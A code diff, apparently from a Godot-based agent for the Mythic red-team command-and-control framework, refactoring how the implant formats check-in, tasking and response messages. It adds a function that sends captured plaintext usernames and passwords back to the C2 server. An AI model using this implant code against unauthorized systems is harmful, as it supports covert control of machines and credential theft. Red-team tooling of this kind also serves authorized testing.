@@ -1,19 +1,40 @@
 extends Node
 
 var checkin_done
-var messages = {}
+var uuid_stage
+var _config
+
+const UUID_STAGE_PAYLOAD = "payload"
+const UUID_STAGE_CALLBACK = "callback"
 
 signal agent_response
 
 func _ready():
 	checkin_done = false
+	uuid_stage = UUID_STAGE_PAYLOAD
+	_config = $".".get_parent().get_node("config")
 
-func _get_checkin_payload():
+func checkin():
+	checkin_done = true
+	uuid_stage = UUID_STAGE_CALLBACK
+
+func get_uuid():
+	var uuid
+
+	match uuid_stage:
+		UUID_STAGE_PAYLOAD:
+			uuid = _config.get_payload_uuid()
+		UUID_STAGE_CALLBACK:
+			uuid = _config.get_callback_uuid()
+		_:
+			uuid = false
+
+	return uuid
+
+func get_checkin_payload():
 	# https:#docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin
-	var uuid = $".".get_parent().get_node("config").get_payload_uuid()
 
-	messages[uuid] = true
-
+	# TODO: gather value elements below and populate via. config
 	var payload = {
 		"action": "checkin", # required
 		"ip": "127.0.0.1", # internal ip address - required
@@ -21,7 +42,7 @@ func _get_checkin_payload():
 		"user": "its-a-feature", # username of current user - required
 		"host": "spooky.local", # hostname of the computer - required
 		"pid": 4444, # pid of the current process - required
-		"uuid": uuid, #uuid of the payload - required
+		"uuid": get_uuid(), #uuid of the payload - required
 		"architecture": "x64", # platform arch - optional
 		"domain": "test", # domain of the host - optional
 		"integrity_level": 3, # integrity level of the process - optional
@@ -30,11 +51,9 @@ func _get_checkin_payload():
 		"decryption_key": "", # decryption key - optional
 	}
 
-	return Marshalls.utf8_to_base64(uuid + to_json(payload)).to_utf8()
+	return to_json(payload)
 
-func _get_tasking_payload():
-	var uuid = $".".get_parent().get_node("config").get_callback_uuid()
-
+func get_tasking_payload():
 	var payload = {
 		"action": "get_tasking",
 		"tasking_size": 1, # TODO: maths - calculate time between call and increase number by some amount?
@@ -42,11 +61,9 @@ func _get_tasking_payload():
 		"get_delegate_tasks": false,# no p2p for us at this time...
 	}
 
-	return Marshalls.utf8_to_base64(uuid + to_json(payload)).to_utf8()
+	return to_json(payload)
 
-func _create_task_response(status, completed, task_id, output, artifacts):
-	var uuid = $".".get_parent().get_node("config").get_callback_uuid()
-
+func create_task_response(status, completed, task_id, output, artifacts = [], credentials = []):
 	var payload = {
 		"action": "post_response",
 		"responses": [],
@@ -57,7 +74,8 @@ func _create_task_response(status, completed, task_id, output, artifacts):
 		"user_output": output,
 		"artifacts": [],
 		"status": "error",
-		"completed": completed
+		"completed": completed,
+		"credentials": credentials
 	}
 
 	if status:
@@ -73,9 +91,24 @@ func _create_task_response(status, completed, task_id, output, artifacts):
 	payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?
 
 	print("returning payload from tasking: ", payload)
-	print("ret payload uuid: ", uuid)
 
-	return Marshalls.utf8_to_base64(uuid + to_json(payload)).to_utf8()
+	return to_json(payload)
+
+func create_credential_response(task_id, username, password, realm, message):
+	var payload = {
+		"task_id": task_id,
+		"user_output": message,
+		"credentials": [
+			{
+				"credential_type": "plaintext",
+				"realm": realm,
+				"credential": password,
+				"account": username,
+			}
+		]
+	}
+
+	return to_json(payload)
 
 func unwrap_payload(packet):	
 	var ret = {
@@ -106,9 +139,26 @@ func unwrap_payload(packet):
 
 	return ret
 
+func wrap_payload(payload):
+	if _config.should_encrypt():
+		pass # TODO: implement encryption
+	else:
+		payload = Marshalls.utf8_to_base64(get_uuid() + payload).to_utf8()
+
+	return payload
+
 func agent_response(payload):
+	print("response payload: ", payload)
+
+	payload = wrap_payload(payload)
 
 	if payload:
 		emit_signal("agent_response", payload)
 	else:
 		print("agent response empty / false : ", payload)
+
+
+func _on_tasking_post_response(tasks):
+	# {"action":"post_response","responses":[{"task_id":"e8e7f996-45db-4ed6-a6ea-2f013c747ef4","status":"success"}]}
+	# TODO: keep queue and 'check off' items which are status success from the retry queue?
+	print("_on_tasking_post_response: ", tasks)
